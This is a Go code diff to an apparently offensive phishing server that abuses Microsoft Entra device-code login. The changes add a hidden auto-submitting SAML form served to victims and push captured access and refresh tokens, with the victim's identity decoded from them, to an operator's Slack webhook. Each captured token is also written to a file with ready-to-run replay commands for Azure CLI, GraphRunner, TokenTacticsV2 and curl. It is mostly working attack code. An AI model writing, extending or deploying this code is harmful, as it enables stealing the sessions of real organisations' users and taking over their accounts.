@@ -2,8 +2,10 @@ package cmd
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"html/template"
 	"io"
 	"log"
 	"log/slog"
@@ -82,6 +84,7 @@ var (
 	tokenFile          string
 	trustedProxyHeader string
 	configFile         string
+	slackWebhook       string
 	tenantInfo         *entra.TenantInfo
 )
 
@@ -100,6 +103,7 @@ type serverConfig struct {
 	TrustedProxyHeader string `json:"trusted_proxy_header"`
 	LogFile            string `json:"log_file"`
 	TokenFile          string `json:"token_file"`
+	SlackWebhook       string `json:"slack_webhook"`
 	Verbose            bool   `json:"verbose"`
 }
 
@@ -119,6 +123,7 @@ func init() {
 	runCmd.Flags().StringVarP(&logFile, "log-file", "l", "", "File to write logs to (default is stdout only)")
 	runCmd.Flags().StringVar(&tokenFile, "token-file", "", "File to write captured tokens to (restricted permissions, 0600)")
 	runCmd.Flags().StringVar(&trustedProxyHeader, "trusted-proxy-header", "", "Trusted proxy preset for client IP resolution: frontdoor, cloudfront (default: use RemoteAddr)")
+	runCmd.Flags().StringVar(&slackWebhook, "slack-webhook", "", "Slack incoming webhook URL for token capture notifications")
 	runCmd.Flags().StringVar(&configFile, "config", "", "Path to JSON config file (flags override config file values)")
 }
 
@@ -540,6 +545,20 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 	},
 }
 
+// samlAutoSubmitTmpl renders a minimal HTML page with a hidden form that
+// auto-submits via JavaScript. The victim's browser POSTs the SAMLRequest
+// directly to the federated IdP, so session cookies are set in their context.
+var samlAutoSubmitTmpl = template.Must(template.New("saml").Parse(`<!DOCTYPE html>
+<html>
+<head><title>Redirecting...</title></head>
+<body>
+<form id="saml" method="POST" action="{{.URL}}">
+{{range $key, $value := .PostData}}<input type="hidden" name="{{$key}}" value="{{$value}}">
+{{end}}</form>
+<script>document.getElementById('saml').submit();</script>
+</body>
+</html>`))
+
 func getLureHandler(clientId string, userAgent string, tokenFile string, trustedHeaders []string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		realClientIP := blocklist.GetClientIP(r, trustedHeaders)
@@ -560,18 +579,36 @@ func getLureHandler(clientId string, userAgent string, tokenFile string, trusted
 			return
 		}
 
-		redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
+		samlRedirect, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent, tenantInfo.Domain)
 		if err != nil {
 			slog.Error("Error during headless browser automation", "error", err)
 			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 			return
 		}
-		go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth, realClientIP, r.UserAgent(), tokenFile)
-		http.Redirect(w, r, redirectUri, http.StatusFound)
+
+		go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth, realClientIP, r.UserAgent(), tokenFile, slackWebhook)
+
+		if samlRedirect.Method == "GET" {
+			// WS-Federation: all state is in URL parameters, simple redirect
+			slog.Info("Redirecting to federated IdP (WS-Federation GET)",
+				"idpUrl", samlRedirect.URL)
+			http.Redirect(w, r, samlRedirect.URL, http.StatusFound)
+		} else {
+			// SAML: serve auto-submit form so cookies are set in victim's browser
+			slog.Info("Serving SAML auto-submit form",
+				"idpUrl", samlRedirect.URL,
+				"formFields", len(samlRedirect.PostData))
+
+			w.Header().Set("Content-Type", "text/html; charset=utf-8")
+			if err := samlAutoSubmitTmpl.Execute(w, samlRedirect); err != nil {
+				slog.Error("Error rendering SAML form", "error", err)
+				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			}
+		}
 	}
 }
 
-func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string, tokenFile string) {
+func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string, tokenFile string, slackWebhook string) {
 	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
 	deadline := time.Now().Add(time.Duration(deviceAuth.ExpiresIn) * time.Second)
 
@@ -602,14 +639,17 @@ func startPollForToken(tenantId string, clientId string, deviceAuth *entra.Devic
 			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
 
 			if tokenFile != "" {
-				writeTokensToFile(tokenFile, result, deviceAuth.UserCode, clientId, clientIP, visitorUserAgent)
+				writeTokensToFile(tokenFile, result, deviceAuth.UserCode, clientId, clientIP, visitorUserAgent, tenantInfo.Domain)
+			}
+			if slackWebhook != "" {
+				sendSlackNotification(slackWebhook, result, deviceAuth.UserCode, clientId, clientIP, tenantInfo.Domain)
 			}
 			return
 		}
 	}
 }
 
-func writeTokensToFile(tokenFile string, result *entra.AuthenticationResult, userCode string, clientId string, clientIP string, visitorUserAgent string) {
+func writeTokensToFile(tokenFile string, result *entra.AuthenticationResult, userCode string, clientId string, clientIP string, visitorUserAgent string, domain string) {
 	f, err := os.OpenFile(tokenFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
 	if err != nil {
 		slog.Error("Failed to write tokens to file", "file", tokenFile, "error", err)
@@ -619,16 +659,89 @@ func writeTokensToFile(tokenFile string, result *entra.AuthenticationResult, use
 
 	timestamp := time.Now().UTC().Format(time.RFC3339)
 	fmt.Fprintf(f, "=== Token Captured: %s ===\n", timestamp)
-	fmt.Fprintf(f, "UserCode:    %s\n", userCode)
-	fmt.Fprintf(f, "ClientId:    %s\n", clientId)
-	fmt.Fprintf(f, "ClientIP:    %s\n", clientIP)
-	fmt.Fprintf(f, "UserAgent:   %s\n", visitorUserAgent)
-	fmt.Fprintf(f, "AccessToken: %s\n", result.AccessToken)
-	fmt.Fprintf(f, "IdToken:     %s\n", result.IdToken)
-	fmt.Fprintf(f, "RefreshToken:%s\n", result.RefreshToken)
+	fmt.Fprintf(f, "UserCode:     %s\n", userCode)
+	fmt.Fprintf(f, "ClientId:     %s\n", clientId)
+	fmt.Fprintf(f, "ClientIP:     %s\n", clientIP)
+	fmt.Fprintf(f, "UserAgent:    %s\n", visitorUserAgent)
+	fmt.Fprintf(f, "\n--- Raw Tokens ---\n")
+	fmt.Fprintf(f, "AccessToken:  %s\n", result.AccessToken)
+	fmt.Fprintf(f, "IdToken:      %s\n", result.IdToken)
+	fmt.Fprintf(f, "RefreshToken: %s\n", result.RefreshToken)
+	fmt.Fprintf(f, "\n--- Token Replay Commands ---\n")
+	fmt.Fprintf(f, "\n# Azure CLI - import access token\n")
+	fmt.Fprintf(f, "export AZURE_ACCESS_TOKEN='%s'\n", result.AccessToken)
+	fmt.Fprintf(f, "\n# GraphRunner (PowerShell) - import tokens\n")
+	fmt.Fprintf(f, "$tokens = @{}\n")
+	fmt.Fprintf(f, "$tokens[\"access_token\"] = '%s'\n", result.AccessToken)
+	fmt.Fprintf(f, "$tokens[\"refresh_token\"] = '%s'\n", result.RefreshToken)
+	fmt.Fprintf(f, "# Then use: Invoke-GraphRunner -Tokens $tokens\n")
+	fmt.Fprintf(f, "\n# TokenTacticsV2 (PowerShell) - refresh for new scopes\n")
+	fmt.Fprintf(f, "$refreshToken = '%s'\n", result.RefreshToken)
+	fmt.Fprintf(f, "Invoke-RefreshToMSGraphToken -refreshToken $refreshToken -domain %s\n", domain)
+	fmt.Fprintf(f, "Invoke-RefreshToAzureManagementToken -refreshToken $refreshToken -domain %s\n", domain)
+	fmt.Fprintf(f, "Invoke-RefreshToAzureCoreManagementToken -refreshToken $refreshToken -domain %s\n", domain)
+	fmt.Fprintf(f, "# Note: TokenTacticsV2 returns an object — use $variable.access_token for the bearer token\n")
+	fmt.Fprintf(f, "# Example: $headers = @{ Authorization = \"Bearer $($MSGraphToken.access_token)\" }\n")
+	fmt.Fprintf(f, "\n# curl - direct Graph API call\n")
+	fmt.Fprintf(f, "curl -s -H 'Authorization: Bearer %s' https://graph.microsoft.com/v1.0/me\n", result.AccessToken)
 	fmt.Fprintf(f, "===\n\n")
 
 	slog.Info("Tokens written to file", "file", tokenFile)
+}
+
+func sendSlackNotification(webhookURL string, result *entra.AuthenticationResult, userCode string, clientId string, clientIP string, domain string) {
+	// Decode the access token to extract user info
+	subject := "unknown"
+	parts := strings.Split(result.AccessToken, ".")
+	if len(parts) == 3 {
+		// Pad base64 if needed
+		payload := parts[1]
+		if pad := len(payload) % 4; pad != 0 {
+			payload += strings.Repeat("=", 4-pad)
+		}
+		decoded, err := base64.StdEncoding.DecodeString(payload)
+		if err == nil {
+			var claims map[string]interface{}
+			if json.Unmarshal(decoded, &claims) == nil {
+				if upn, ok := claims["upn"].(string); ok {
+					subject = upn
+				} else if email, ok := claims["email"].(string); ok {
+					subject = email
+				} else if sub, ok := claims["sub"].(string); ok {
+					subject = sub
+				}
+			}
+		}
+	}
+
+	msg := fmt.Sprintf(":fishing_pole_and_fish: *Token Captured*\n"+
+		"*Domain:* %s\n"+
+		"*Subject:* %s\n"+
+		"*UserCode:* %s\n"+
+		"*ClientId:* %s\n"+
+		"*ClientIP:* %s\n"+
+		"*Scope:* %s",
+		domain, subject, userCode, clientId, clientIP, result.Scope)
+
+	payload, err := json.Marshal(map[string]string{"msg": msg})
+	if err != nil {
+		slog.Error("Failed to marshal Slack payload", "error", err)
+		return
+	}
+
+	resp, err := http.Post(webhookURL, "application/json", strings.NewReader(string(payload)))
+	if err != nil {
+		slog.Error("Failed to send Slack notification", "error", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		slog.Error("Slack webhook returned non-200", "status", resp.Status)
+		return
+	}
+
+	slog.Info("Slack notification sent", "subject", subject)
 }
 
 func loadConfigFile(cmd *cobra.Command, path string) {
@@ -665,6 +778,7 @@ func loadConfigFile(cmd *cobra.Command, path string) {
 	setIfNotChanged("trusted-proxy-header", cfg.TrustedProxyHeader)
 	setIfNotChanged("log-file", cfg.LogFile)
 	setIfNotChanged("token-file", cfg.TokenFile)
+	setIfNotChanged("slack-webhook", cfg.SlackWebhook)
 
 	if cfg.Verbose && !cmd.Flags().Changed("verbose") {
 		verbose = true
